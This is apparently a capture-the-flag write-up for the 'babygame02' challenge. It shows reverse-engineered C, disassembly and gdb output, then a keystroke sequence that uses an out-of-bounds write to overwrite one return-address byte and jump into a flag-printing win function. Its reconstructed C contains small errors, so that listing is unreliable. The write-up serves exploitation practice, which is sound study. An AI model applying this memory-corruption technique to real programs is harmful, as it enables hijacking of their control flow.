# `babygame02`

Reversing engineering the given program provides us something like:

```c
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <unistd.h>

#define NUM_ROWS 30
#define NUM_COLUMNS 90
#define MAP_SIZE NUM_ROWS * NUM_COLUMNS

const char END_TILE = 'X';
const char DEFAULT_TILE = '.';
char player_tile = '@';

struct player {
    int row;
    int column;
};

void init_player(struct player *player) {
    player->row = 4;
    player->colum = 4;
}

void init_map(char *map, struct player *player) {
    for (int i = 0; i < NUM_ROWS; i++) {
        for (int j = 0; j < NUM_COLUMNS; j++) {
            const int index = i*NUM_COLUMNS + j;
            if (i == NUM_ROWS - 1 && j == NUM_COLUMNS - 1) {
                map[index] = END_TILE;
            } else if (i == player->row && j == player->column) {
                map[index] = player_tile;
            } else {
                map[index] = DEFAULT_TILE;
            }
        }
    }
}

void clear_screen() {
  printf("\x1b[2J");
  fflush(stdout);
}

void find_player_pos(char *map) {
    for (int i = 0; i < NUM_ROWS; i++) {
        for (int j = 0; j < NUM_COLUMNS; j++) {
            const int index = i*NUM_COLUMNS + j;
            if (map[index] == player_tile) {
                printf("Player position: %d %d\n", i, j);
                return;
            }
        }
    }
}

void find_end_tile_pos(char *map) {
    for (int i = 0; i < NUM_ROWS; i++) {
        for (int j = 0; j < NUM_COLUMNS; j++) {
            const int index = i*NUM_COLUMNS + j;
            if (map[index] == END_TILE) {
                printf("End tile position: %d %d\n", i, j);
                return;
            }
        }
    }
}

void print_map(char *map) {
    clear_screen();
    find_player_pos(map);
    find_end_tile_pos(map);

    for (int i = 0; i < NUM_ROWS; i++) {
        for (int j = 0; j < NUM_COLUMNS; j++) {
            const int index = i*NUM_COLUMNS + j;
            putchar(map[index]);
        }
        putchar('\n');
    }
    fflush(stdout);
}

void sigint_handler() {
    exit(0);
}

void move_player(struct player *, char *, char);

void solve_round(char *map, struct player *player) {
    while (player->column != NUM_COLUMNS - 1) {
        if (player->column < NUM_COLUMNS - 1) {
            move_player(player, map, 'd');
        } else {
            move_player(player, map, 'a');
        }
        print_map(map, player);
    }

    while (player->row != NUM_ROWS - 1) {
        if (player->row < NUM_ROWS - 1) {
            move_player(player, map, 's');
        } else {
            move_player(player, map, 'w');
        }
        print_map(map, player);
    }
    print_map(map, player);

    sleep(0);
    if (player->row == NUM_ROWS - 1 && player->column == NUM_COLUMNS - 1) {
        puts("You win!");
    }
}

void move_player(struct player *player, char *map, char input) {
    if (input == 'l') {
        player_tile = getchar();
    }
    if (input == 'p') {
        solve_round(map, player);
    }

    int player_index = player->row * NUM_COLUMNS + player->column;
    map[player_index] = DEFAULT_TILE;

    if (input == 'w') {
        player->row--;
    } else if (input == 's') {
        player->row++;
    } else if (input == 'a') {
        player->column--;
    } else if (input == 'd') {
        player->column++;
    }

    player_index = player->row * NUM_COLUMNS + player->column;
    map[player_index] = player_tile;
}

void win() {
    char flag[60];

    FILE *flag_file = fopen("flag.txt", "r");
    if (flag_file == NULL) {
        puts("flag.txt does not exist in current directory");
        exit(0);
    }

    fgets(flag, 60, flag_file);
    printf(flag);
}

int main(void)
{
    struct player player;
    char map[MAP_SIZE];

    init_player(&player);
    init_map(map, &player);

    print_map(map, &player);
    signal(SIGINT, sigint_handler);

    do {
        do {
            const char input = getchar();
            move_player(&player, map, input);
            print_map(map, &player);
        } while (player.row != NUM_ROWS - 1);
    } while (player.column != NUM_COLUMNS - 1);

    puts("You win!");

    return 0;
}
```

Note the application doesn't appear to have any stack canaries nor ASLR.
Further, it looks like there's a buffer underflow issue in `move_player`, where
we can decrease the player position below `0`. The `win` function that we want
to call however, is not called anywhere, so it looks like we'll need to modify a
return address to jump there.

There's one further complication, `move_player` will first write the default
tile (`'.'`) to the current player position, then write the player tile (which
we can control via the sending an `'l'` input). This means if we just worked
backups up the heap decrementing our position from `(0, 0)` down we'd soon run
into corruption issues, since the `player` object is just above the map on the
stack in this function, this means we'll start writing `0x2e` bytes all over the
position, and jumping our location all over the place. This means we can
probably write at most one byte.

Investigating the binary, we see the address of `win` is at `0x0804975d`:

    $ objdump -dM intel ./game | grep '<win>'
    0804975d <win>:

Looking at the assembly for `main`:

    $ objdump -dM intel game | sed -n '/^[a-f0-9]\+ <main>/,/^$/p' 
    08049674 <main>:
     8049674:	8d 4c 24 04          	lea    ecx,[esp+0x4]
     8049678:	83 e4 f0             	and    esp,0xfffffff0
     804967b:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
     804967e:	55                   	push   ebp
     804967f:	89 e5                	mov    ebp,esp
     8049681:	53                   	push   ebx
     8049682:	51                   	push   ecx
     8049683:	81 ec a0 0a 00 00    	sub    esp,0xaa0
     8049689:	e8 b2 fa ff ff       	call   8049140 <__x86.get_pc_thunk.bx>
     804968e:	81 c3 72 29 00 00    	add    ebx,0x2972
     8049694:	8d 85 60 f5 ff ff    	lea    eax,[ebp-0xaa0]
     804969a:	50                   	push   eax
     804969b:	e8 b1 fd ff ff       	call   8049451 <init_player>
     80496a0:	83 c4 04             	add    esp,0x4
     80496a3:	8d 85 60 f5 ff ff    	lea    eax,[ebp-0xaa0]
     80496a9:	50                   	push   eax
     80496aa:	8d 85 6b f5 ff ff    	lea    eax,[ebp-0xa95]
     80496b0:	50                   	push   eax
     80496b1:	e8 6d fb ff ff       	call   8049223 <init_map>
     80496b6:	83 c4 08             	add    esp,0x8
     80496b9:	83 ec 08             	sub    esp,0x8
     80496bc:	8d 85 60 f5 ff ff    	lea    eax,[ebp-0xaa0]
     80496c2:	50                   	push   eax
     80496c3:	8d 85 6b f5 ff ff    	lea    eax,[ebp-0xa95]
     80496c9:	50                   	push   eax
     80496ca:	e8 e0 fc ff ff       	call   80493af <print_map>
     80496cf:	83 c4 10             	add    esp,0x10
     80496d2:	83 ec 08             	sub    esp,0x8
     80496d5:	8d 83 06 d2 ff ff    	lea    eax,[ebx-0x2dfa]
     80496db:	50                   	push   eax
     80496dc:	6a 02                	push   0x2
     80496de:	e8 ad f9 ff ff       	call   8049090 <signal@plt>
     80496e3:	83 c4 10             	add    esp,0x10
     80496e6:	e8 85 f9 ff ff       	call   8049070 <getchar@plt>
     80496eb:	88 45 f7             	mov    BYTE PTR [ebp-0x9],al
     80496ee:	0f be 45 f7          	movsx  eax,BYTE PTR [ebp-0x9]
     80496f2:	83 ec 04             	sub    esp,0x4
     80496f5:	8d 95 6b f5 ff ff    	lea    edx,[ebp-0xa95]
     80496fb:	52                   	push   edx
     80496fc:	50                   	push   eax
     80496fd:	8d 85 60 f5 ff ff    	lea    eax,[ebp-0xaa0]
     8049703:	50                   	push   eax
     8049704:	e8 6b fd ff ff       	call   8049474 <move_player>
     8049709:	83 c4 10             	add    esp,0x10
     804970c:	83 ec 08             	sub    esp,0x8
     804970f:	8d 85 60 f5 ff ff    	lea    eax,[ebp-0xaa0]
     8049715:	50                   	push   eax
     8049716:	8d 85 6b f5 ff ff    	lea    eax,[ebp-0xa95]
     804971c:	50                   	push   eax
     804971d:	e8 8d fc ff ff       	call   80493af <print_map>
     8049722:	83 c4 10             	add    esp,0x10
     8049725:	8b 85 60 f5 ff ff    	mov    eax,DWORD PTR [ebp-0xaa0]
     804972b:	83 f8 1d             	cmp    eax,0x1d
     804972e:	75 b6                	jne    80496e6 <main+0x72>
     8049730:	8b 85 64 f5 ff ff    	mov    eax,DWORD PTR [ebp-0xa9c]
     8049736:	83 f8 59             	cmp    eax,0x59
     8049739:	75 ab                	jne    80496e6 <main+0x72>
     804973b:	83 ec 0c             	sub    esp,0xc
     804973e:	8d 83 3f e0 ff ff    	lea    eax,[ebx-0x1fc1]
     8049744:	50                   	push   eax
     8049745:	e8 66 f9 ff ff       	call   80490b0 <puts@plt>
     804974a:	83 c4 10             	add    esp,0x10
     804974d:	90                   	nop
     804974e:	b8 00 00 00 00       	mov    eax,0x0
     8049753:	8d 65 f8             	lea    esp,[ebp-0x8]
     8049756:	59                   	pop    ecx
     8049757:	5b                   	pop    ebx
     8049758:	5d                   	pop    ebp
     8049759:	8d 61 fc             	lea    esp,[ecx-0x4]
     804975c:	c3                   	ret

We see the call to `move_player` is at `0x08049704`, this is just one byte off
the location of `win` so it should be enough to stomp the return address in this
function. Running the application through `gdb` and adding a breakpoint in
`move_player` we can inspect the stack:

    (gdb) x/32x $ebp
    0xffffa928:     0xffffb3e8      0x08049709      0xffffa948      0x00000077
    0xffffa938:     0xffffa953      0x080496eb      0x00000000      0x0001e7dc
    0xffffa948:     0x00000004      0x00000004      0x2e001000      0x2e2e2e2e
    0xffffa958:     0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e
    0xffffa968:     0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e
    0xffffa978:     0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e
    0xffffa988:     0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e
    0xffffa998:     0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e      0x2e2e2e2e

All the `0x2e`s are the map info (they are bytes for `'.'`). So we see the map
starts at `0xffffa950`and importantly we see the return address at `0xffffa92c`

This is before any movement, so the player position is `(4, 4)`, that is the
player position in is at `0xffffa94b` and `0xffffa94c`, all the `0x2e`s are the
map info, so the map starts at `0xffffa953`, and finally the return address is
at `0xffffa92c` so we want to move back `0xffffa953 - 0xffffa92c = 0x27` bytes
from the start of the map. To jump to there directly, note that a `'w'`
instruction corresponds to moving the position back `NUM_COLUMNS` position, so
if we place our player on the first row in position `NUM_COLUMNS - 0x27 = 0x33`
then we a `'w'` instruction should put us in the desired location. Finally, note
that we probably don't want to return to the start of `win` as there is where
all the stack setup etc. is handled, conveniently if we look at the disassembly
we see there's a NOP sled just after the start of this function:

    $ objdump -dM intel game | sed -n '/^[a-f0-9]\+ <win>/,/^$/p' 
    0804975d <win>:
     804975d:	55                   	push   ebp
     804975e:	89 e5                	mov    ebp,esp
     8049760:	53                   	push   ebx
     8049761:	83 ec 44             	sub    esp,0x44
     8049764:	e8 d7 f9 ff ff       	call   8049140 <__x86.get_pc_thunk.bx>
     8049769:	81 c3 97 28 00 00    	add    ebx,0x2897
     804976f:	90                   	nop
     8049770:	90                   	nop
     8049771:	90                   	nop
     8049772:	90                   	nop
     8049773:	90                   	nop
     8049774:	90                   	nop
     8049775:	90                   	nop
     8049776:	90                   	nop
     8049777:	90                   	nop
     8049778:	90                   	nop
     8049779:	83 ec 08             	sub    esp,0x8
     804977c:	8d 83 48 e0 ff ff    	lea    eax,[ebx-0x1fb8]
     8049782:	50                   	push   eax
     8049783:	8d 83 4a e0 ff ff    	lea    eax,[ebx-0x1fb6]
     8049789:	50                   	push   eax
     804978a:	e8 41 f9 ff ff       	call   80490d0 <fopen@plt>
     804978f:	83 c4 10             	add    esp,0x10
     8049792:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
     8049795:	83 7d f4 00          	cmp    DWORD PTR [ebp-0xc],0x0
     8049799:	75 1c                	jne    80497b7 <win+0x5a>
     804979b:	83 ec 0c             	sub    esp,0xc
     804979e:	8d 83 54 e0 ff ff    	lea    eax,[ebx-0x1fac]
     80497a4:	50                   	push   eax
     80497a5:	e8 06 f9 ff ff       	call   80490b0 <puts@plt>
     80497aa:	83 c4 10             	add    esp,0x10
     80497ad:	83 ec 0c             	sub    esp,0xc
     80497b0:	6a 00                	push   0x0
     80497b2:	e8 09 f9 ff ff       	call   80490c0 <exit@plt>
     80497b7:	83 ec 04             	sub    esp,0x4
     80497ba:	ff 75 f4             	push   DWORD PTR [ebp-0xc]
     80497bd:	6a 3c                	push   0x3c
     80497bf:	8d 45 b8             	lea    eax,[ebp-0x48]
     80497c2:	50                   	push   eax
     80497c3:	e8 b8 f8 ff ff       	call   8049080 <fgets@plt>
     80497c8:	83 c4 10             	add    esp,0x10
     80497cb:	83 ec 0c             	sub    esp,0xc
     80497ce:	8d 45 b8             	lea    eax,[ebp-0x48]
     80497d1:	50                   	push   eax
     80497d2:	e8 79 f8 ff ff       	call   8049050 <printf@plt>
     80497d7:	83 c4 10             	add    esp,0x10
     80497da:	90                   	nop
     80497db:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
     80497de:	c9                   	leave
     80497df:	c3                   	ret

So it's enough to update the return address to be anywhere in there, e.g.
`0x0804976f`. To summarise, we want to:

  - Move the player to the `0x33` position on the first row
  - Set the player tile to `0x6f` (i.e. `'o'`)
  - Move the player up one row

Noting that the player starts at `(4, 4)` so our sequence of instructions should
be:

  - `"wwww"` move to the first row
  - `(0x33 - 0x4) * "d"` move to position `0x33` on that row
  - `"lo"` update our tile to the byte we want in the return address
  - `"w"` jump up to the memory address we want to stomp with our tile
